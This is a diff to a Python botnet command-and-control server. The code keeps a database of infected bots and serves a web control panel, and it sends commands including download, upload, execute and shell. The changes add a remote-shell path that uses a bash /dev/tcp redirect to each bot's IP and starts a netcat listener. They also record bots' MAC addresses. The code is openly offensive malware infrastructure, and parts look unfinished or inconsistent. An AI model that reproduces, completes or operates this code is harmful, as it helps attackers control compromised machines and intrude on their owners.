@@ -11,9 +11,10 @@ import sqlite3
 import sys
 import webbrowser
 import http.server
+import subprocess
 
 # The server's IP address and port
-SERVER_IP = "172.22.9.105"
+SERVER_IP = "192.168.10.162"
 SERVER_PORT = 12345
 
 # The server's public and private keys
@@ -27,7 +28,7 @@ DATABASE = "botnet.db"
 TABLE = "bots"
 
 # The botnet's columns
-COLUMNS = ["id", "ip", "port", "public_key", "private_key"]
+COLUMNS = ["id", "ip", "port", "mac_address", "description", "public_key", "private_key"]
 
 # The botnet's commands
 COMMANDS = ["ping", "download", "upload", "execute", "shell", "exit"]
@@ -46,7 +47,7 @@ class BotnetServer(http.server.BaseHTTPRequestHandler):
         self.wfile.write(b"<h1>Botnet Server</h1>")
         self.wfile.write(b"<h2>Bots</h2>")
         self.wfile.write(b"<table>")
-        self.wfile.write(b"<tr><th>ID</th><th>IP</th><th>Port</th><th>Public Key</th><th>Private Key</th><th>Description</th></tr>")
+        self.wfile.write(b"<tr><th>ID</th><th>IP</th><th>Port</th><th>Mac-Address</th><th>Description</th><th>Public Key</th><th>Private Key</th></tr>")
         for bot in get_bots():
             self.wfile.write(b"<tr>")
             for column in bot:
@@ -114,7 +115,7 @@ class BotnetServer(http.server.BaseHTTPRequestHandler):
         self.send_header("Location", "/")
         self.end_headers()
 def start_web_interface():
-    web_interface = http.server.HTTPServer((SERVER_IP, 8080), BotnetServer)
+    web_interface = http.server.HTTPServer((SERVER_IP, 48080), BotnetServer)
     web_interface.serve_forever()
 
 def start_server():
@@ -130,14 +131,14 @@ def start_server():
         bot_id = hashlib.md5(mac_address.encode()).hexdigest()
 
         bot = get_bot(bot_id)
-        add_bot(bot_ip, bot_port)
+        add_bot(bot_ip, bot_port, mac_address)
         bot_socket.close()
         print(f"Bot {bot_id} connected")
 
 def create_database():
     connection = sqlite3.connect(DATABASE)
     cursor = connection.cursor()
-    cursor.execute(f"CREATE TABLE IF NOT EXISTS {TABLE} ({', '.join([f'{column} TEXT' for column in COLUMNS])}, description TEXT)")
+    cursor.execute(f"CREATE TABLE IF NOT EXISTS {TABLE} ({', '.join([f'{column} TEXT' for column in COLUMNS])})")
     connection.commit()
     connection.close()
 def update_description_in_db(id, description):
@@ -166,11 +167,11 @@ def get_bot(id):
     connection.close()
     return bot
 
-def add_bot(ip, port):
+def add_bot(ip, port, mac_address):
     connection = sqlite3.connect(DATABASE)
     cursor = connection.cursor()
     bot_id = hashlib.md5(f'{ip}:{port}'.encode()).hexdigest()
-    cursor.execute(f"INSERT INTO {TABLE} VALUES (?, ?, ?, NULL, NULL, NULL)", (bot_id, ip, port))
+    cursor.execute(f"INSERT INTO {TABLE} VALUES (?, ?, ?, ?, NULL, NULL, NULL)", (bot_id, ip, port, mac_address))
     connection.commit()
     connection.close()
 
@@ -192,23 +193,29 @@ def rename_bot_in_db(id, new_name):
         print(f"Error renaming bot: {e}")
 
 def send_command(bot, command):
-    bot_id, bot_ip, bot_port = bot
-    bot_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    bot_socket.connect((bot_ip, int(bot_port)))
-    bot_socket.send(command.encode())
-    response = bot_socket.recv(4096).decode()
-    bot_socket.close()
+    bot_id, bot_ip, bot_port, mac_address, description, public_key, private_key = bot
     if command == 'shell':
-        print("Shell output: ", response)
-    else:
-        print(f"Bot {bot_id} responded with {response}")
+        # Use subprocess to run the echo command
+        subprocess.run(f'echo "shell" >&/dev/tcp/{bot_ip}/49267 0>&1', shell=True)
+        print(f'Sent command: {command} to bot at {bot_ip}')  # Debugging statement
+    #bot_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    #bot_socket.connect((bot_ip, int(49266)))
+    #bot_socket.send(command.encode())
+    #bot_socket.close()
+    if command == 'ping':
+        # Open a terminal and execute the ping command
+        subprocess.run(['gnome-terminal', '--', 'ping', bot_ip])
+    if command == 'shell':
+        subprocess.run(['gnome-terminal', '--', '/usr/bin/nc', '-l', '6212'])
+    #else:
+    #    print(f"Bot {bot_id} responded with {response}")
 
 def main():
     if not os.path.exists(DATABASE):
         create_database()
     threading.Thread(target=start_web_interface).start()
     threading.Thread(target=start_server).start()
-    webbrowser.open(f"http://{SERVER_IP}:{8080}")
+    webbrowser.open(f"http://{SERVER_IP}:{48080}")
     while True:
         time.sleep(1)
 
